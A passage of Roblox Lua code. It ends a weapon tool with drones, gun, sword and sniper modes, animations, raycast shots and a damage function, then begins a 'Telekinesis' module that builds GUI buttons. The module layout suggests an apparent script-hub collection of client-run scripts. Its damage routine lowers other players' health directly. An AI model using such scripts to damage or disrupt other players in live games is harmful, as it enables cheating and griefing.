LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function RemoveDrones2()
attack=true
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3-0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.4*i,0,-0.7)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(2.3+0.84*i,0,0.7-0.7*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
print("FoundDrone")
for _,s in pairs(v:children()) do
if s.className=="Part" then
s.Anchored=true
coroutine.resume(coroutine.create(function(Part,Model) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,v)
end
end
end
end
wait(1)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.6+0.3*i,0,-0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.17+0.4*i,0,-0.7)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
LW.C0=cf(-1.5+0.3*i, 0.5, -0.3*i) * euler(3.14-0.84*i,0,0.7*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function RemoveGun()
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.8*i) * euler(1.27*i,0,0.2-1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.2*i) * euler(0.5+1.07*i,0,0.6-0.6*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
for _,s in pairs(gun:children()) do
if s.className=="Part" then
coroutine.resume(coroutine.create(function(Part,Model) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,gun)
end
end
wait(0.7)
for i=0,1,0.1 do
wait()
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.5, 0.5, -0.1+0.1*i) * euler(1.57-1.57*i,0,0)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
end
attack=false
end
 
function RemoveSword()
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.8*i) * euler(1.27*i,0,0.2-1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1*i,0)
LW.C0=cf(-1.5, 0.5, -0.1*i) * euler(1.57*i,0,-0.4+0.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
for _,s in pairs(sword:children()) do
if s.className=="Part" then
coroutine.resume(coroutine.create(function(Part,Model) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,sword)
end
end
wait(0.7)
for i=0,1,0.1 do
wait()
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.5, 0.5, -0.1+0.1*i) * euler(1.57-1.57*i,0,0)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
end
attack=false
end
 
function RemoveSniper()
attack=true
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.4*i,0,0)
snwld1.C0=euler(2.07+0.3*i,0,0)*cf(0,1,0)
RW.C0=cf(1, 0.3, -0.5-0.3*i) * euler(0.9+0.37*i,0,-0.3-1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.3-1*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.07,0,0.7-0.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for _,s in pairs(sniper:children()) do
if s.className=="Part" then
coroutine.resume(coroutine.create(function(Part,Model) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,sniper)
end
end
wait(0.7)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.4-0.4*i,0,0)
RW.C0=cf(1+0.5*i, 0.3, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0.3-0.3*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.07-1.07*i,0,0.5-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 
 
function Lightning(p0,p1,tym,ofs,col,th,tra)
local magz = (p0 - p1).magnitude local curpos = p0 local trz = {-ofs,ofs}
for i=1,tym do 
local li = Instance.new("Part",workspace) li.TopSurface =0 li.BottomSurface = 0 li.Anchored = true  li.Transparency = tra or 0.4 li.BrickColor = BrickColor.new(col)
li.formFactor = "Custom" li.CanCollide = false li.Size = Vector3.new(th,th,magz/tym) local ofz = Vector3.new(trz[math.random(1,2)],trz[math.random(1,2)],trz[math.random(1,2)]) 
light1=Instance.new("PointLight")
light1.Brightness=.8
light1.Color=Color3.new(.2,255,.2)
light1.Range=8
light1.Parent=li
local trolpos = CFrame.new(curpos,p1)*CFrame.new(0,0,magz/tym).p+ofz
if tym == i then 
local magz2 = (curpos - p1).magnitude li.Size = Vector3.new(th,th,magz2)
li.CFrame = CFrame.new(curpos,p1)*CFrame.new(0,0,-magz2/2)
else
li.CFrame = CFrame.new(curpos,trolpos)*CFrame.new(0,0,magz/tym/2)
end
curpos = li.CFrame*CFrame.new(0,0,magz/tym/2).p game.Debris:AddItem(li,.2)
end
end
 
spread=0
range=500
rangepower=50
function shoottrail(ShootPosition,baseprt,Damage,Knockback,Size)
coroutine.resume(coroutine.create(function() 
local spreadvector = (Vector3.new(math.random(-spread,spread),math.random(-spread,spread),math.random(-spread,spread))) * (baseprt.Position-ShootPosition).magnitude/100
local dir = CFrame.new((baseprt.Position+ShootPosition)/2,ShootPosition+spreadvector)
local hit,pos = rayCast(baseprt.Position,dir.lookVector,10,modelzorz)
local rangepos = range
local function drawtrail(From,To)
local effectsmsh = Instance.new("CylinderMesh")
effectsmsh.Scale = Vector3.new(1,1,1)
effectsmsh.Name = "Mesh"
local effectsg = Instance.new("Part")
effectsg.formFactor = 3
effectsg.CanCollide = false
effectsg.Name = "Eff"
effectsg.Locked = true
effectsg.Anchored = true
effectsg.Size = Vector3.new(0.2,0.2,0.2)
effectsg.Parent = modelzorz
effectsmsh.Parent = effectsg
effectsg.BrickColor = BrickColor.new("Bright yellow")
effectsg.Reflectance = 0.4
local LP = From
local point1 = To
local mg = (LP - point1).magnitude
effectsmsh.Scale = Vector3.new(2,mg*5,2)
effectsg.CFrame = CFrame.new((LP+point1)/2,point1) * CFrame.Angles(math.rad(90),0,0)
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.1 do
wait()
effectsg.Transparency = 1*i
effectsmsh.Scale = Vector3.new(Size-Size*i,mg*5,Size-Size*i)
end 
effectsg.Parent = nil 
end))
end
local newpos = baseprt.Position
local inc = rangepower
repeat
wait() wait() 
rangepos = rangepos - 10
dir = dir
if Mode~="Sniper" then
dir = dir * CFrame.Angles(math.rad(-1),0,0)
end
hit,pos = rayCast(newpos,dir.lookVector,inc,Character)
drawtrail(newpos,pos)
newpos = newpos + (dir.lookVector * inc)
if inc >= 20 then
inc = inc - 10
end
if hit ~= nil then
rangepos = 0
end
until rangepos <= 0
if hit ~= nil then
if hit.Parent:FindFirstChild("Humanoid") ~= nil then
critical=false
if SnipAim==true then
if hit.Name=="Head" then
coroutine.resume(coroutine.create(function(HeadPart)
for i=0,0.5,0.1 do
wait()
HeadPart.Velocity=vt(0,60,0) 
end
end),hit)
print("CRITICAL")
critical=true
p=it("Part")
p.Parent=workspace
p.CanCollide=false
p.Transparency=1
p.CFrame=hit.CFrame
p.Anchored=true
local GUI = it("BillboardGui") 
GUI.Adornee = p
GUI.Parent = p
GUI.Active = true 
GUI.Enabled = true 
GUI.Size = UDim2.new(1, 0, 1, 0) 
GUI.StudsOffset = vt(0, 4, 0) 
local Chat = it("TextLabel") 
Chat.Parent = GUI 
Chat.FontSize = "Size12" 
Chat.Position = UDim2.new(0.599999964, 0, 0, 0) 
Chat.Visible = true 
Chat.Text = "Critical!" 
coroutine.resume(coroutine.create(function(Part) 
for i=0,4,0.1 do
wait()
Part.CFrame=Part.CFrame*cf(0,0.05,0)
end
Part.Parent=nil
end),p) 
for i=0,7 do
        Blood=it("Part")
        Blood.Name="Blood"
        Blood.TopSurface="Smooth"
        Blood.BottomSurface="Smooth"
        Blood.formFactor="Plate"
        Blood.BrickColor=BrickColor:Red()
        Blood.Size=vt(1,.4,1)
        Blood.Velocity=vt(math.random(-4,4),math.random(5,25),math.random(-4,4))
        Blood.CFrame=hit.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
        Blood.Parent=workspace 
        Blood.Velocity=vt(math.random(-20,20),math.random(20,50),math.random(-20,20)) 
        Blood.CanCollide=false
        coroutine.resume(coroutine.create(function(blod) 
        wait(0.1)
        blod.CanCollide=true
        wait(5) 
        blod.Parent = nil 
        end),Blood) 
end
end
hum = hit.Parent.Humanoid
tTorso=hit.Parent.Torso
end
if critical==true then
CRIT=true
Damagefunc1(hit,Damage*math.random(3,8),Knockback)
else
Damagefunc1(hit,Damage,Knockback)
end
attackdebounce=false
--ADmg(hum,hit)
elseif hit.Parent.Parent ~= nil and hit.Parent.Parent:FindFirstChild("Humanoid") ~= nil then
if SnipAim==true then
if hit.Parent.className == "Hat" then 
hatCF=hit.CFrame
coroutine.resume(coroutine.create(function(hat)
hat.Handle:BreakJoints()
hat.Handle.CFrame=hatCF
hat.Handle.CanCollide=true
hat.Handle.Velocity=vt(math.random(-10,10),40,math.random(-10,10)) 
wait(3)
hatCF=hat.Handle.CFrame
hat.Parent=workspace
for i=0,4,0.2 do
wait()
hat.Handle.CFrame=hatCF
hat.Handle.Velocity=vt(math.random(-5,5),20,math.random(-5,5)) 
end
end),hit.Parent)
--[[hit:BreakJoints() 
hit.CFrame=CF
hit.Velocity = vt(math.random(-5,5),20,math.random(-5,5)) ]]
print("BREAKHAT")
end
end
hum = hit.Parent.Parent.Humanoid
tTorso=hit.Parent.Parent.Torso
Damagefunc1(hit.Parent.Parent.Torso,Damage,Knockback)
attackdebounce=false
--ADmg(hum,hit)
end
end
end))
end
 
function findNearestTorso(pos)
    local list = game:service("Workspace"):children()
    local torso = nil
    local dist = 50
    local temp = nil
    local human = nil
    local temp2 = nil
    for x = 1, #list do
        temp2 = list[x]
        if (temp2.className == "Model") and (temp2 ~= Character) and (temp2.Name ~= "Fenrier") then
            temp = temp2:findFirstChild("Torso")
            human = temp2:findFirstChild("Humanoid")
            if (temp ~= nil) and (human ~= nil) and (human.Health > 0) then
                if (temp.Position - pos).magnitude < dist then
                    torso = temp
                    dist = (temp.Position - pos).magnitude
                end
            end
        end
    end
    return torso
end
 
function MagicCircle(brickcolor,cframe,x1,y1,z1,x2,y2,z2,x3,y3,z3)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe*cf(x2,y2,z2)
local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
coroutine.resume(coroutine.create(function() 
for i=0,1,0.1 do
wait()
prt.CFrame=prt.CFrame
prt.Transparency=i
msh.Scale=msh.Scale+vt(x3,y3,z3)
end
prt.Parent=nil
end))
end 
 
Damagefunc1=function(hit,Damage,Knockback)
    if hit.Parent==nil then
        return
    end
    CPlayer=Bin 
    h=hit.Parent:FindFirstChild("Humanoid")
    if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
    if attackdebounce == false then 
    attackdebounce = true 
    coroutine.resume(coroutine.create(function() 
    wait(0.2) 
    attackdebounce = false 
    end)) 
    Damage=Damage
--[[        if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
            return
        end]]
--            hs(hit,1.2) 
            c=Instance.new("ObjectValue")
            c.Name="creator"
            c.Value=game:service("Players").LocalPlayer
            c.Parent=h
            game:GetService("Debris"):AddItem(c,.5)
        Damage=Damage+math.random(0,10)
--        h:TakeDamage(Damage)
        blocked=false
        block=hit.Parent:findFirstChild("Block")
        if block~=nil then
        print("herp")
        if block.Value>0 then
        blocked=true
        block.Value=block.Value-1
        print(block.Value)
        end
        end
        if blocked==false then
--        h:TakeDamage(Damage)
        h.Health=h.Health-Damage
        showDamage(hit.Parent,Damage,.5)
        else
        h:TakeDamage(1)
        showDamage(hit.Parent,1,.5)
        end
        vp=Instance.new("BodyVelocity")
        vp.P=500
        vp.maxForce=Vector3.new(math.huge,0,math.huge)
--        vp.velocity=Character.Torso.CFrame.lookVector*Knockback
        vp.velocity=Head.CFrame.lookVector*Knockback+Head.Velocity/1.05
        if Knockback>0 then
            vp.Parent=hit.Parent.Torso
        end
        game:GetService("Debris"):AddItem(vp,.25)
                c=Instance.new("ObjectValue")
            c.Name="creator"
            c.Value=Player
            c.Parent=h
            game:GetService("Debris"):AddItem(c,.5)
        CRIT=false
        hitDeb=true
        AttackPos=6
    end
    end 
end
 
showDamage=function(Char,Dealt,du)
    m=Instance.new("Model")
    m.Name=tostring(Dealt)
    h=Instance.new("Humanoid")
    h.Health=0
    h.MaxHealth=0
    h.Parent=m
    c=Instance.new("Part")
    c.Transparency=0
    c.BrickColor=BrickColor:Red()
    if CRIT==true then
        c.BrickColor=BrickColor.new("Really red")
    end
    c.Name="Head"
    c.TopSurface=0
    c.BottomSurface=0
    c.formFactor="Plate"
    c.Size=Vector3.new(1,.4,1)
    ms=Instance.new("CylinderMesh")
    ms.Scale=Vector3.new(.8,.8,.8)
    if CRIT==true then
        ms.Scale=Vector3.new(1,1.25,1)
    end
    ms.Parent=c
    c.Reflectance=0
    Instance.new("BodyGyro").Parent=c
    c.Parent=m
    c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
    f=Instance.new("BodyPosition")
    f.P=2000
    f.D=100
    f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
    f.position=c.Position+Vector3.new(0,3,0)
    f.Parent=c
    game:GetService("Debris"):AddItem(m,.5+du)
    c.CanCollide=false
    m.Parent=workspace
    c.CanCollide=false
end
 
function ob1d(mouse) 
if attack == true then return end 
hold=true
if Mode=="Drones" and Aiming==true then
print("Attack drones")
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(0.5+1.07*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Drone1debounce=false
Drone2debounce=false
Drone3debounce=false
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
coroutine.resume(coroutine.create(function(Drone) 
while hold==true do
so("http://roblox.com/asset/?id=10209257",Drone.DPart1,0.5,1.5) 
shoottrail(MMouse.Hit.p,Drone.DPart1,5,0,1)
wait(math.random(0,2)+math.random())
end
end),v)
end
end
while hold==true do
wait()
end
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(1.57-1.07*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
elseif Aiming==false then
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" and v:findFirstChild("CanShoot")~=nil then
coroutine.resume(coroutine.create(function(Drone) 
while hold==true do
if v.CanShoot.Value==true then
print("Shoot")
so("http://roblox.com/asset/?id=10209257",Drone.DPart1,0.5,1.5) 
shoottrail(Drone.DPart6.Position,Drone.DPart1,5,0,1)
elseif v.CanShoot.Value==false then
print("NoShoot")
end
wait(math.random(0,2)+math.random())
end
end),v)
end
end
end
if Mode=="Gun" then
print("Shoot")
Shoot()
end
if Mode=="Sword" then
slash1()
if hold==true then
slash2()
end
if hold==true then
slash3()
end
wait(0.5)
Bg.Parent=nil
Neck.C0=necko*euler(0,0,0)
swld1.C0=euler(0,-1.57,-1.57)*cf(0,1,0)
swld1.C1=euler(0,1.57,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.4)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
if Mode=="Sniper" and SnipAim==true then
SniperShoot()
end
end 
 
function ob1u(mouse) 
hold = false 
end 
 
buttonhold = false 
 
eul=0
function key(key) 
if attack == true then return end 
if Mode=="Drones" then
if key=="z" then
RemoveDrones()
Mode="Choose"
equipanim() 
return 
end
if key=="f" then
if Aiming==false then
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(0.5+2.64*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(3.14-1.57*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Aiming=true
coroutine.resume(coroutine.create(function() 
while Aiming==true do
wait()
DroneTarget=MMouse.Hit.p
end
end))
wait(0.5)
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(1.57-1.07*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
elseif Aiming==true then
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(.5+1.07*i,0,-1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+0.5*i, 0.5, -0.5*i) * euler(1.57*i,0,-0.2+1.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Aiming=false
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
Valuee=Instance.new("BoolValue")
Valuee.Parent=v
Valuee.Name="CanShoot"
print("Found Drone")
coroutine.resume(coroutine.create(function(DDrone,Val,Gyro) 
--coroutine.resume(coroutine.create(function() 
while Aiming==false do
wait()
local target = findNearestTorso(DDrone.DPart1.Position)
if target~=nil then
Val.Value=true
Gyro.cframe=cf(DDrone.DPart1.Position, target.Position)
else
Val.Value=false
Gyro.cframe=cf(DDrone.DPart1.Position, Torso.Position)
end
end
Val.Parent=nil
end),v,Valuee,v.DPart1.DroneGyro)
end
end
wait(0.5)
for i=0,1,0.1 do
wait()
RW.C0=cf(1+.5*i, 0.5, -0.5+0.5*i) * euler(1.57-1.07*i,0,-1+1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1-.5*i, 0.5, -0.5+0.5*i) * euler(1.57-1.57*i,0,1-1.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
end
end
if Mode=="Gun" then
if key=="x" then
RemoveGun()
Mode="Choose"
equipanim() 
return 
end
end
if Mode=="Sword" then
if key=="c" then
RemoveSword()
Mode="Choose"
equipanim() 
return 
end
if key=="f" then
BowShoot()
end
end
if Mode=="Sniper" then
if key=="v" then
if SnipAim==true then
SnipAim=false
UnAim()
end
RemoveSniper()
Mode="Choose"
equipanim()
return
end
if key=="f" then
if SnipAim==false then
SnipAim=true
Aim()
else
SnipAim=false
UnAim()
end
end
end
if Mode=="Choose" then
if key=="f" then
RemoveDrones2()
end
if key=="z" then
Drone1,Drone2,Drone3=Drones()
end
if key=="x" then
Gun()
end
if key=="c" then
Sword()
end
if key=="v" then
Sniper()
end
end
end 
 
function key2(key) 
if key=="f" then
BowAim=false
end
end 
 
function s(mouse) 
mouse.Button1Down:connect(function() ob1d(mouse) end) 
mouse.Button1Up:connect(function() ob1u(mouse) end) 
mouse.KeyDown:connect(key) 
mouse.KeyUp:connect(key2) 
unsheathed = true 
player = Player 
ch = Character 
MMouse = mouse 
RSH = ch.Torso["Right Shoulder"] 
LSH = ch.Torso["Left Shoulder"] 
-- 
RSH.Parent = nil 
LSH.Parent = nil 
-- 
RW.Part0 = ch.Torso 
RW.C0 = CFrame.new(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) 
RW.Part1 = ch["Right Arm"] 
RW.Parent = ch.Torso 
--_G.R = RW 
-- 
LW.Part0 = ch.Torso 
LW.C0 = CFrame.new(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1 = CFrame.new(0, 0.5, 0) 
LW.Part1 = ch["Left Arm"] 
LW.Parent = ch.Torso 
--_G.L = LW 
--
equipanim() 
end 
 
function ds(mouse) 
hideanim() 
wait(0) 
RW.Parent = nil 
LW.Parent = nil 
RSH.Parent = player.Character.Torso 
LSH.Parent = player.Character.Torso 
end 
 
Bin.Selected:connect(s) 
Bin.Deselected:connect(ds) 


end}
module[3] = {"Telekinesis",function()
--[[
	
 _________  _______   ___       _______   ___  __    ___  ________   _______   ________  ___  ________      
|\___   ___\\  ___ \ |\  \     |\  ___ \ |\  \|\  \ |\  \|\   ___  \|\  ___ \ |\   ____\|\  \|\   ____\     
\|___ \  \_\ \   __/|\ \  \    \ \   __/|\ \  \/  /|\ \  \ \  \\ \  \ \   __/|\ \  \___|\ \  \ \  \___|_    
     \ \  \ \ \  \_|/_\ \  \    \ \  \_|/_\ \   ___  \ \  \ \  \\ \  \ \  \_|/_\ \_____  \ \  \ \_____  \   
      \ \  \ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \\ \  \ \  \ \  \\ \  \ \  \_|\ \|____|\  \ \  \|____|\  \  
       \ \__\ \ \_______\ \_______\ \_______\ \__\\ \__\ \__\ \__\\ \__\ \_______\____\_\  \ \__\____\_\  \ 
        \|__|  \|_______|\|_______|\|_______|\|__| \|__|\|__|\|__| \|__|\|_______|\_________\|__|\_________\
                                                                                 \|_________|   \|_________|
                                                                                                            
                                                                                                                                                                                             
	
	Made By: astrologicality.
	#1 Edited By: Rocky2u.
	#2 Edited By: KrystalTeam.
	
	Keys:
		Left Mouse Click: Telekinesis.
		E: Spawn Brick At Cursor Location.
		F: Toggle Telekinesis Visibility.
		G: Blow Selected Object.
		H: UnAnchored Selected Object.
		V: 100 Studs Away The Selected Object.
		C: 5 Studs Away The Selected Object.
		X: +5 Studs Away The Selected Object.
		Z: -5 Studs Away The Selected Object.
	
--]]

Fire = false

Sparkles = false

Box = false

local Players = game.Players

local Player = Players.LocalPlayer

local Mouse = Player:GetMouse()
	
local dist = 25

local trans = 0

local dwn=false

local Bin = Instance.new("HopperBin") 

Bin.Name = "Telekinesis" 

Bin.Parent = Player.Backpack


local ScreenGUI = Instance.new("ScreenGui", Player.PlayerGui)

local Color = Instance.new("Color3Value", ScreenGUI)

local ColorValue = Color.Value

local Blue = Instance.new("TextButton", ScreenGUI)

local Red = Instance.new("TextButton", ScreenGUI)

local Green = Instance.new("TextButton", ScreenGUI)

local Yellow = Instance.new("TextButton", ScreenGUI)

local Pink = Instance.new("TextButton", ScreenGUI)

local LightBlue = Instance.new("TextButton", ScreenGUI)

local White = Instance.new("TextButton", ScreenGUI)

local FireTrue = Instance.new("TextButton", ScreenGUI)

local FireFalse = Instance.new("TextButton", ScreenGUI)

local SparklesTrue = Instance.new("TextButton", ScreenGUI)

local SparklesFalse = Instance.new("TextButton", ScreenGUI)

local BoxTrue = Instance.new("TextButton", ScreenGUI)

local BoxFalse = Instance.new("TextButton", ScreenGUI)

Color.Name = "Color"

Blue.BackgroundColor3 = BrickColor.new("Bright blue").Color

Blue.Transparency = 0.5

Blue.Size = UDim2.new(0, 20 ,0, 20)

Blue.Position = UDim2.new(1, -35, 1, -35)

Blue.Name = "Blue"

Blue.Text = ""

Blue.Visible = false

Red.BackgroundColor3 = BrickColor.new("Bright red").Color

Red.Transparency = 0.5

Red.Size = UDim2.new(0, 20 ,0, 20)

Red.Position = UDim2.new(1,-65, 1, -35)

Red.Name = "Red"

Red.Text = ""

Red.Visible = false

Green.BackgroundColor3 = BrickColor.new("Bright green").Color

Green.Transparency = 0.5

Green.Size = UDim2.new(0, 20 ,0, 20)

Green.Position = UDim2.new(1,-95, 1, -35)

Green.Name = "Green"

Green.Text = ""

Green.Visible = false

Yellow.BackgroundColor3 = BrickColor.new("New Yeller").Color

Yellow.Transparency = 0.5

Yellow.Size = UDim2.new(0, 20 ,0, 20)

Yellow.Position = UDim2.new(1,-125, 1, -35)

Yellow.Name = "Yellow"

Yellow.Text = ""

Yellow.Visible = false

Pink.BackgroundColor3 = BrickColor.new("Hot pink").Color

Pink.Transparency = 0.5

Pink.Size = UDim2.new(0, 20 ,0, 20)

Pink.Position = UDim2.new(1,-155, 1, -35)

Pink.Name = "Pink"

Pink.Text = ""

Pink.Visible = false

LightBlue.BackgroundColor3 = BrickColor.new("Cyan").Color

LightBlue.Transparency = 0.5

LightBlue.Size = UDim2.new(0, 20 ,0, 20)

LightBlue.Position = UDim2.new(1,-185, 1, -35)

LightBlue.Name = "LightBlue"

LightBlue.Text = ""

LightBlue.Visible = false

White.BackgroundColor3 = BrickColor.new("White").Color

White.Transparency = 0.5

White.Size = UDim2.new(0, 20 ,0, 20)

White.Position = UDim2.new(1,-215, 1, -35)

White.Name = "White"

White.Text = ""

White.Visible = false

FireFalse.BackgroundColor3 = BrickColor.new("Really black").Color

FireFalse.Transparency = 0.5

FireFalse.Size = UDim2.new(0, 50 ,0, 20)

FireFalse.Position = UDim2.new(1,-65, 1, -65)

FireFalse.Name = "FireFalse"

FireFalse.Text = "Fire: F"

FireFalse.Visible = false

FireFalse.FontSize = "Size12"

FireFalse.Font = "ArialBold"

FireFalse.TextColor = BrickColor.new(255,255,255)

FireFalse.TextTransparency = 0

FireTrue.BackgroundColor3 = BrickColor.new("Really black").Color

FireTrue.Transparency = 0.5

FireTrue.Size = UDim2.new(0, 50 ,0, 20)

FireTrue.Position = UDim2.new(1,-65, 1, -65)

FireTrue.Name = "FireTrue"

FireTrue.Text = "Fire: T"

FireTrue.Visible = false

FireTrue.FontSize = "Size12"

FireTrue.Font = "ArialBold"

FireTrue.TextColor = BrickColor.new(255,255,255)

FireTrue.TextTransparency = 0

SparklesTrue.BackgroundColor3 = BrickColor.new("Really black").Color

SparklesTrue.Transparency = 0.5

SparklesTrue.Size = UDim2.new(0, 50 ,0, 20)

SparklesTrue.Position = UDim2.new(1,-125, 1, -65)

SparklesTrue.Name = "SparklesTrue"

SparklesTrue.Text = "SP: T"

SparklesTrue.Visible = false

SparklesTrue.FontSize = "Size12"

SparklesTrue.Font = "ArialBold"

SparklesTrue.TextColor = BrickColor.new(255,255,255)

SparklesTrue.TextTransparency = 0

SparklesFalse.BackgroundColor3 = BrickColor.new("Really black").Color

SparklesFalse.Transparency = 0.5

SparklesFalse.Size = UDim2.new(0, 50 ,0, 20)

SparklesFalse.Position = UDim2.new(1,-125, 1, -65)

SparklesFalse.Name = "SparklesFalse"

SparklesFalse.Text = "SP: F"

SparklesFalse.Visible = false

SparklesFalse.FontSize = "Size12"

SparklesFalse.Font = "ArialBold"

SparklesFalse.TextColor = BrickColor.new(255,255,255)

SparklesFalse.TextTransparency = 0

BoxTrue.BackgroundColor3 = BrickColor.new("Really black").Color

BoxTrue.Transparency = 0.5

BoxTrue.Size = UDim2.new(0, 50 ,0, 20)

BoxTrue.Position = UDim2.new(1,-185, 1, -65)

BoxTrue.Name = "BoxTrue"

BoxTrue.Text = "Box: T"

BoxTrue.Visible = false

BoxTrue.FontSize = "Size12"

BoxTrue.Font = "ArialBold"

BoxTrue.TextColor = BrickColor.new(255,255,255)

BoxTrue.TextTransparency = 0

BoxFalse.BackgroundColor3 = BrickColor.new("Really black").Color

BoxFalse.Transparency = 0.5

BoxFalse.Size = UDim2.new(0, 50 ,0, 20)

BoxFalse.Position = UDim2.new(1,-185, 1, -65)

BoxFalse.Name = "BoxFalse"

BoxFalse.Text = "Box: F"

BoxFalse.Visible = false

BoxFalse.FontSize = "Size12"

BoxFalse.Font = "ArialBold"

BoxFalse.TextColor = BrickColor.new(255,255,255)

BoxFalse.TextTransparency = 0

local bawl = Instance.new("Part", game.Lighting)

bawl.Name="TelekinesisGrab"

local bp = Instance.new("BodyPosition", bawl)

local w = Instance.new("Weld", bawl) 

function onButton1Down(mouse)
	
	bawl.Size = Vector3.new(2,2,2) 
	
	bawl.Material="Neon"
	
	bawl.Shape=0
	
	bawl.Transparency=trans
	
	bawl.Name="TelekinesisGrab"
	
	bawl.CanCollide = false  
	
	bawl.Parent = game.Workspace
	
	w.Parent = bawl 
	
	w.Name = "Weld"
	
